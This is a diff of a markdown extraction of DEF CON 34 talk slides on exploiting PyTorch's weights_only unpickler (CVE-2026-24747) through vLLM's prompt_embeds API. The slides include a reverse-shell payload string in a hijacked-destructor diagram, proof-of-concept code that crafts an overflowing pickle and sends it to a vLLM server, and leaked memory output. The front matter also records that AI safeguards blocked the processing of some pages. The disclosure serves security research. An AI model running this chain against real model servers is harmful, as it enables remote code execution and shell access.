@@ -8,15 +8,15 @@ year: 2026
 source_pdf: "DEF CON 34/DEF CON 34 - Ji'an Zhou, Lei Lu - One Chain to Own Them All - Breaking AI Infrastructures - azraelxuemo v3.pdf"
 pages: 143
 sha256: "0ab97ef76707c58a515d9ea2732e5cb33e69a9f9585016d390fb98cec1def43c"
-text_chars: 131985
+text_chars: 133772
 ocr_pages: 115
 has_ocr: true
 redacted_secrets: 0
 ocr_confidence: 87.8
 ocr_unreliable_blocks: 9
-content_note: "117 of 143 pages were rendered and read against the source PDF by a vision model; 112 were rewritten. PAGES 79-91 AND 118-130 WERE NOT REVIEWED: both ranges were stopped by the model API's cyber safeguards on two different models. Those 26 pages remain first-pass extraction and are not verified. See markdown/UNVERIFIED.md."
-vision_verified_pages_changed: 25
-vision_verified_pages: 117
+content_note: "130 of 143 pages were rendered and read against the source PDF by a vision model; 123 were rewritten. PAGES 118-130 WERE NOT REVIEWED: the range was stopped by the model API's cyber safeguards on two different models. Those 13 pages remain first-pass extraction and are not verified. See markdown/UNVERIFIED.md."
+vision_verified_pages_changed: 11
+vision_verified_pages: 130
 ocr_timeouts: 0
 pages_recovered_from_text_layer: 0
 companion_files: []
@@ -2499,24 +2499,22 @@ Partial RELRO    Canary found   NX enabled   No PIE   No RPATH   No RUNPATH   No
 
 https://salsa.debian.org/cpython-team/python3/-/blob/master/debian/rules
 
-
-> Recovered by OCR — confidence 84/100 on the text kept, 79/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
-
 ```text
-% Amazing Feature
+Amazing Feature
 Python Interpreter / python3 / Repository
 68 dpkg_buildflags = DEB_BUILD_MAINT_OPTIONS="hardening=-pie $(DPKG_OPTIMIZE)" dpkg-buildflags
-70 |ifeq (,$(filter $(distrelease),stretch buster bullseye trusty xenial bionic focal impish) )
-71 with_nopie := yes
-72 dpkg_pieflags = DEB_BUILD_MAINT_OPTIONS="hardening=-pie $(DPKG_OPTIMIZE)" dpkg-buildflags
+69 dpkg_pieflags = DEB_BUILD_MAINT_OPTIONS="hardening=-pie $(DPKG_OPTIMIZE)"dpkg-buildflags
+70 ifeq (,$(filter $(distrelease),stretch buster bullseye trusty xenial bionic focal impish))
+71   with_nopie := yes
+72   dpkg_pieflags = DEB_BUILD_MAINT_OPTIONS="hardening=-pie $(DPKG_OPTIMIZE)" dpkg-buildflags
 73 endif
 Python Interpreter / python3 / Repository
-1412 ifeq ($(with_nopie) , yes)
-© 1413 dh_installdirs -p$(p_npie) \
-1414 usr/bin
-1415 cp -p $(buildd_nopie)/python $(d_npie)/usr/bin/$(PVER)
+1412 ifeq ($(with_nopie),yes)
+1413     dh_installdirs -p$(p_npie) \
+1414             usr/bin
+1415     cp -p $(buildd_nopie)/python $(d_npie)/usr/bin/$(PVER)
 1416 endif
-1 p_npie := $(PVER)-nopie
+1 p_npie   := $(PVER)-nopie
 2 VER=3.15
 3 PVER=python$(VER)
 79
@@ -2527,109 +2525,140 @@ https://salsa.debian.org/cpython-team/python3/-/blob/master/debian/rules
 
 ##### 😄 We have system address!
 
+*Diagram: a `c10::TensorImpl` box with a field `storage_` has an arrow pointing to a table titled "c10::StorageImpl (Corrupted Memory Layout)":*
+
+| Address | slot[0] | slot[1] |
+| --- | --- | --- |
+| 0 | vptr | refcount_ + weakcount_ |
+| 0x10 | **data_ptr_.ptr_.data_** | **data_ptr_.ptr_.ctx_.deleter** |
+| 0x20 | data_ptr_.ptr_.ctx_.ptr | data_ptr_.device_ |
+| 0x30 | size_bytes_ | [next fields omitted] |
+
+*A dashed red arrow runs from the 0x10 row down to a box labeled "Target Real Memory (Overwritten Payload)":*
+
+`"bash -i >&/dev/tcp/ip/port 0>&1\0"`
+
+*Another dashed red arrow runs from the 0x10 row right to a box labeled "Hijacked Destructor Logic":*
+
+~~deleter_(ctx_.ptr);~~
+**system(ctx_.ptr);**
+**// exec shell payload**
+
 80
-
-
-> Recovered by OCR — confidence 84/100 on the text kept, 77/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
-
-```text
-a
-c10::Tensorlmpl
-storage_
-Address
-0x10
-0x20
-0x30
-© We have system address!
-c10::Storagelmp! (Corrupted Memory Layout)
-slot[0] slot[1]
-vptr refcount_ + weakcount_
-data_ptr_.ptr_.data_ ° data_ptr_.ptr_.ctx_.deleter e-
-size_bytes_ [next™ fields omitted]
-Target Real Memory overwritten Payload)
-"bash -i >&/dev/tcp/ip/port 0>&1\0"
-Hijacked Destructor Logic
-system(ctx_.ptr);
-// exec shell payload
-80
-```
 
 ## Slide 81
 
-81
+*Fully black slide — no visible text, image, or page number.*
 
 ## Slide 82
 
 ### **Bypass Again!**
 
+*Screenshot of a GitHub security advisory:*
+
+**Loading a malicious PyTorch checkpoint with weights_only=True can result in arbitrary code execution**  `Edit advisory`
+
+🛡 `Published`  `High`  **malfet** published **GHSA-63cw-57p8-fm3p** on Jan 27 · 34 comments
+
+| Package | Affected versions | Patched versions |
+| --- | --- | --- |
+| 🐍 **pytorch** (pip) | <=2.9.1 | >=2.10.0 |
+
+**azraelxuemo** opened on Jun 28, 2025 · edited by **malfet** ▾
+
+**Description**
+
+**Summary**
+
+A vulnerability in PyTorch's `weights_only` unpickler allows an attacker to craft a malicious checkpoint file (`.pth`) that, when loaded with `torch.load(..., weights_only=True)`, can corrupt memory and potentially lead to arbitrary code execution.
+
+**Vulnerability Details**
+
+The `weights_only=True` unpickler failed to properly validate pickle opcodes and storage metadata, allowing:
+
+1. **Heap memory corruption** via `SETITEM` / `SETITEMS` opcodes applied to non-dictionary types
+2. **Storage size mismatch** between declared element count and actual data in the archive
+
+**Impact**
+
+An attacker who can convince a user to load a malicious checkpoint file may achieve arbitrary code execution in the context of the victim's process.
+
+**Credit**
+
+Ji'an Zhou
+
+*Right-hand side panel:*
+
+**Severity**
+
+`High` 8.8 / 10
+
+**CVSS v3 base metrics**
+
+| | |
+| --- | --- |
+| Attack vector | Network |
+| Attack complexity | Low |
+| Privileges required | None |
+| User interaction | Required |
+| Scope | Unchanged |
+| Confidentiality | High |
+| Integrity | High |
+| Availability | High |
+
+CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H
+
+**CVE ID**
+
+CVE-2026-24747
+
+**Weaknesses**
+
+No CWEs
+
+**Credits**
+
+**azraelxuemo** — Reporter ✓
+
 82
 
 https://github.com/pytorch/pytorch/security/advisories/GHSA-63cw-57p8-fm3p
-
-
-> Recovered by OCR — confidence 92/100 on the text kept, 89/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
-
-```text
-Bypass Again!
-Loading a malicious PyTorch checkpoint with weights_only=True can result in Eait advisory
-arbitrary code execution
-© Published malfet published GHSA-63cw-57p8-fm3p on Jan 27 - 34 comments
-Package Affected versions Patched versions Severity
-@ pytorch (pip), <=2.9.1 >=2.10.0 8.8 /10
-CVSS v3 base metrics
-azraelxuemo opened on Jun 28, 2025 + edited by malfet ~ lee Attack vector Network
-Attack complexity Low
-Description Privileges required None
-User interaction Required
-Summary Scope Unchanged
-A vulnerability in PyTorch's weights_only unpickler allows an attacker to craft a malicious checkpoint file ( .pth ) that, when Confidentiality High
-loaded with torch. load(..., weights_only=True) , can corrupt memory and potentially lead to arbitrary code execution. Integrity High
-Availability High
-Vulnerability Details Learn more about base metrics
-The weights_only=True unpickler failed to properly validate pickle opcodes and storage metadata, allowing: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H
-1. Heap memory corruption via SETITEM / SETITEMS opcodes applied to non-dictionary types
-CVEID
-2. Storage size mismatch between declared element count and actual data in the archive
-CVE-2026-24747
-Impact
-An attacker who can convince a user to load a malicious checkpoint file may achieve arbitrary code execution in the context of the
-victim's process. No CWEs
-Credit Credits
-Ji'an Zhou
-https://github.com/pytorch/pytorch/security/advisories/GHSA-63cw-57p8-fm3p
-```
 
 ## Slide 83
 
 ### **Back to vLLM**
 
-83
-
-
-> Recovered by OCR — confidence 87/100 on the text kept, 74/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
-
 ```text
-"Back to vLLM
-POST /v1/completions { “prompt_embeds": "<base64>" }
-api_server.py:651 handler.create_completion(request, raw_request)
-request.prompt_embeds)
-weights_only=True)
-|— serving_completion.py:138 renderer.render_prompt_and_embeds(prompt_embeds=
+POST /v1/completions { "prompt_embeds": "<base64>" }
+|
+├── api_server.py:651         handler.create_completion(request, raw_request)
+├── serving_completion.py:138 renderer.render_prompt_and_embeds(prompt_embeds=
+                                  request.prompt_embeds)
+├── renderer.py:254           self.load_prompt_embeds(prompt_embeds)
+├── renderer.py:148           torch.load(io.BytesIO(pybase64.b64decode(embed)),
+                                  weights_only=True)
+```
+
+```python
 import requests
 import base64
 url = "http://127.0.0.1:8000/v1/completions"
 headers = {
-"Content-Type": "application/json"
+    "Content-Type": "application/json"
 }
 with open("tensor.pt","rb") as f:
-content=base64. b64encode(f.read()).decode()
+    content=base64.b64encode(f.read()).decode()
 data = {
+    "prompt_embeds":content
 }
 requests.post(url, headers=headers, json=data)
-83
 ```
 
+83
+
 ## Slide 84
+
+*Quotation-mark decoration top-left; a large black rectangle fills most of the slide (likely a video placeholder) with no visible content.*
 
 84
 
@@ -2643,9 +2672,7 @@ requests.post(url, headers=headers, json=data)
 
 🤕 I do not want this f***ing trick
 
-😭 Direct torch.load attack with PIE
-
-❌
+😭 Direct torch.load attack with PIE ❌
 
 86
 
@@ -2661,145 +2688,190 @@ requests.post(url, headers=headers, json=data)
 
 ### **Inspiration**
 
-88
-
-
-> Recovered by OCR — confidence 81/100 on the text kept, 76/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
+*(A faded, partially cut-off terminal prompt line is visible above the command.)*
 
 ```text
-Inspiration
-xuemo>curl http://localhost:8000/v1/completions -H "Content-Type: application/json" -d '{
-"model": "facebook/opt-125m",
-"prompta": "Hello, my name is",
-"max_tokens": 50
+xuemo>curl http://localhost:8000/v1/completions  -H "Content-Type: application/json"  -d '{
+    "model": "facebook/opt-125m",
+    "prompta": "Hello, my name is",
+    "max_tokens": 50
+  }'
 {"error":{"message":"[{'type': 'value_error', 'loc': ('body',), 'msg': 'Value error, Either prompt or prompt_embeds mus
-t be provided and no = tioul is', 'max_tokens': 50
-}, 'ctx': {'error': |ValueError('Either prompt or prompt_embeds must be provided and non-empty.')}}]",|"type":"Bad Reques
-88
+t be provided and non-empty.', 'input': {'model': 'facebook/opt-125m', 'prompta': 'Hello, my name is', 'max_tokens': 50
+}, 'ctx': {'error': ValueError('Either prompt or prompt_embeds must be provided and non-empty.')}}]","type":"Bad Reques
+t","param":null,"code":400}}xuemo>
 ```
+
+88
 
 ## Slide 89
 
 ### **Error Exfiltration**
 
-❌
+❌                                                          ✅
 
-✅
-
-89
-
-
-> Recovered by OCR — confidence 84/100 on the text kept, 79/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
-
-```text
-"Error Exfiltration
-x Vv]
-elif key[@] == BINPERSID[Q]:
-elif key[0] == APPEND[Q]: pid = self.stack. pop()
-item = self.stack.pop() wee
-list_obj = self.stack[-1] if (
-. . . . : type(pid) is tuple
-if type(list_obj) is not list: and len(pid) > 0
-raise UnpicklingError( and torch,serialization._maybe_decode_ascii(pid[@]) != "storage"
-f"Can only append to lists,
-but got {type(list_obj )} f"Only persistent_load of storage is allowed, but got
-) {pid[@]}"
-89
+```python
+elif key[0] == APPEND[0]:
+    item = self.stack.pop()
+    list_obj = self.stack[-1]
+    if type(list_obj) is not list:
+        raise UnpicklingError(
+            f"Can only append to lists,
+                but got {type(list_obj)}"
+        )
+    list_obj.append(item)
 ```
+
+```python
+elif key[0] == BINPERSID[0]:
+    pid = self.stack.pop()
+    ...
+    if (
+        type(pid) is tuple
+        and len(pid) > 0
+        and torch.serialization._maybe_decode_ascii(pid[0]) != "storage"
+    ):
+        raise UnpicklingError(
+            f"Only persistent_load of storage is allowed, but got
+                {pid[0]}"
+        )
+    self.append(self.persistent_load(pid))
+```
+
+89
 
 ## Slide 90
 
 ### **It Works!**
 
-90
+```python
+elif key[0] == BINPERSID[0]:
+    pid = self.stack.pop()
+    ...
+    if (
+        type(pid) is tuple
+        and len(pid) > 0
+        and torch.serialization._maybe_decode_ascii(pid[0]) != "storage"
+    ):
+        raise UnpicklingError(
+            f"Only persistent_load of storage is allowed, but got
+                {pid[0]}"
+        )
+    self.append(self.persistent_load(pid))
+```
 
-
-> Recovered by OCR — confidence 88/100 on the text kept, 88/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**
-
-```text
-“It Works!
-elif key[@] == BINPERSID[Q]:
-pid = self.stack.pop()
-if (
-type(pid) is tuple
-and len(pid) > @
-and torch.serialization._maybe_decode_ascii(pid[@]) != "storage"
-raise UnpicklingError(
-f"Only_persistent_load of storage is allowed, but got
-)
-self.append(self.persistent_load(pid) )
+```python
 overflow_length = 256
-poc = generate_overflow_tensor_pid(overflow_length, @)
+poc = generate_overflow_tensor_pid(overflow_length,0)
 poc += TUPLE1+BINPERSID
 poc += STOP
+
 with open("tensor/data.pkl","wb") as f:
-f.write(poc)
-os.system("zip -r tensor.pt tensor/")
-import torch
-Traceback (most recent call last):
-File "/home/xuemo/pytorch-2.8.0/load.py", line 2, in <module>
-File "/home/xuemo/pytorch-2.8.0/.venv/lib/python3.12/site-packages/torch/serialization.py", line 1
-529, in load
-raise pickle.UnpicklingError(_get_wo_message(str(e))) from None
-_pickle.UnpicklingError: Weights only load failed. In PyTorch 2.6, we changed the default value of t
-he “weights_only” argument in “torch.load’ from “False” to ‘True’. Re-running “torch.load* with “wei
-ghts_only* set to ‘False’ will likely succeed, but it can result in arbitrary code execution. Do it
-only if you got the file from a trusted source.
-Please file an issue with the following so that we can make ‘weights_only=True’ compatible with your
-use case: WeightsUnpickler error: Only persistent_load of storage is allowed, but got tensor([
-10, 281474976710673, 33,
-126486786867200, 126815498681248, 4572279526795640868,
-33, 126491081834496, 126815498681120,
-0, 33, 126495376801792,
-126815498681120, 0, 49,
-126499671769088 , 126815498681152, 249950292643938704,
-24576089, 48, 977,
-1, 10666592, 385,
-90
+    f.write(poc)
+os.system("zip –r tensor.pt tensor/")
 ```
+
+```python
+import torch
+torch.load("tensor.pt")
+```
+
+```text
+Traceback (most recent call last):
+  File "/home/xuemo/pytorch-2.8.0/load.py", line 2, in <module>
+    torch.load("tensor.pt")
+  File "/home/xuemo/pytorch-2.8.0/.venv/lib/python3.12/site-packages/torch/serialization.py", line 1
+529, in load
+    raise pickle.UnpicklingError(_get_wo_message(str(e))) from None
+_pickle.UnpicklingError: Weights only load failed. In PyTorch 2.6, we changed the default value of t
+he `weights_only` argument in `torch.load` from `False` to `True`. Re-running `torch.load` with `wei
+ghts_only` set to `False` will likely succeed, but it can result in arbitrary code execution. Do it
+only if you got the file from a trusted source.
+Please file an issue with the following so that we can make `weights_only=True` compatible with your
+use case: WeightsUnpickler error: Only persistent_load of storage is allowed, but got tensor([
+            1,             2,             3,
+            4,             5,             6,
+            7,             8,             9,
+           10, 281474976710673,            33,
+126486786867200, 126815498681248, 4572279526795640868,
+           33, 126491081834496, 126815498681120,
+            0,            33, 126495376801792,
+126815498681120,             0,            49,
+126499671769088, 126815498681152, 249950292643938704,
+     24576089,            48,           977,
+            1,      10666592,           385,
+```
+
+90
 
 ## Slide 91
 
 ### **Works in vLLM!**
 
-91
-
-
-> Recovered by OCR — confidence 83/100 on the text kept, 76/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**
-
-```text
+```python
 import requests
 import base64
-url = “http://127.0.0.1:8000/v1/completions"
+url = "http://127.0.0.1:8000/v1/completions"
 headers = {
-"Content-Type": “application/json"
-"Works in vLLM!
+    "Content-Type": "application/json"
 }
 with open("tensor.pt","rb") as f:
+    content=base64.b64encode(f.read()).decode()
 data = {
+    "prompt_embeds":content
 }
 response = requests.post(url, headers=headers, json=data)
 print("Status Code:", response.status_code)
-Status Code: 500
-{"error":{"message":"Weights only load failed. In PyTorch 2.6, we changed the default value of the “weights_only* argum
-ent in “torch.load* from ‘False’ to ‘True’. Re-running “torch.load* with ‘weights_only* set to “False* will likely succ
-eed, but it can result in arbitrary code execution. Do it only if you got the file from a trusted source.\nPlease file
-an_issue with the following so that we can make ‘weights only=True* compatible with your use case: WeightsUnpickler err
-or: Only persistent_load of storage is allowed, but got tensor([ a van
-8, 9,\n 10, Q, 81,\n 14063427522076
-8, 235788384, @,\n Q, Q, 221,\n
-Abs 352951805673476, 82,\n 208, 140634025451320,
-Q, 235799328, 235799336, \n 235799336, Q, @,\
-@,\n Q, 208, 193,\n 235747728, 27
-66409169796213799, 235738272, \n Q, Q, 235799360, \n
-108083376, 140628152523088, @,\n Q, Q,
-Q, Q, 255, 1,\n 35295180567
-3476, 1271310385153, 225,\n 235799088, 140634275220912, 235738272, \n
-236341824, Q, 235799360, \n 108083376, 140627898250448,
-e, 5, 1,\n 352951805673476, 1271310385153, 3
-3,\n 236291120, 235738864, 224,\n 32, 154130528
-; 235731424, \n 140627898261744, 225; 140634275220912, \n 235798832, 91
+print(response.text)
 ```
+
+*(A faded, partially cut-off terminal prompt line is visible above the output.)*
+
+```text
+xuemo>python3 send.py
+Status Code: 500
+{"error":{"message":"Weights only load failed. In PyTorch 2.6, we changed the default value of the `weights_only` argum
+ent in `torch.load` from `False` to `True`. Re-running `torch.load` with `weights_only` set to `False` will likely succ
+eed, but it can result in arbitrary code execution. Do it only if you got the file from a trusted source.\nPlease file
+an issue with the following so that we can make `weights_only=True` compatible with your use case: WeightsUnpickler err
+or: Only persistent_load of storage is allowed, but got tensor([          1,             2,
+  3,\n            4,             5,             6,\n
+  7,\n
+  8,             9,\n            10,            0,            81,\n      140634275220768,
+  235788384,             0,\n            0,             0,             221,\n
+            1,   352951805673476,            80,\n
+                                    208,   140634025451320,
+  235798472,\n            0,             0,             0,\n
+      140634260153216,
+      0,             0,\n            0,             0,             0,\n
+      0,   235799328,   235799336,\n
+      235799336,             0,             0,\n
+            0,             0,             0,\n
+            0,             0,             0,\n
+            0,           208,           193,\n
+      235747728, 2766409169796213799,   235738272,\n
+      0,             0,   235799360,\n
+      108083376,   140628152523088,             0,\n
+      0,             0,             0,\n
+            0,             0,             1,\n
+            0,             0,             0,\n
+            0,           255,             1,\n
+      352951805673476,   1271310385153,           225,\n
+      235799088,   140634275220912,   235738272,\n
+      236341824,             0,   235799360,\n
+      108083376,   140627898250448,             0,\n
+            0,             0,             0,\n
+            0,             0,             1,\n
+            0,             0,             0,\n
+            0,             5,             1,\n
+      352951805673476,   1271310385153,            33,\n
+      236291120,   235738864,           224,\n
+            32,   154130528,   235731424,\n
+      140627898261744,           225,   140634275220912,\n
+      235798832, [illegible — remainder cut off at bottom edge of slide]
+```
+
+91
 
 ## Slide 92
 
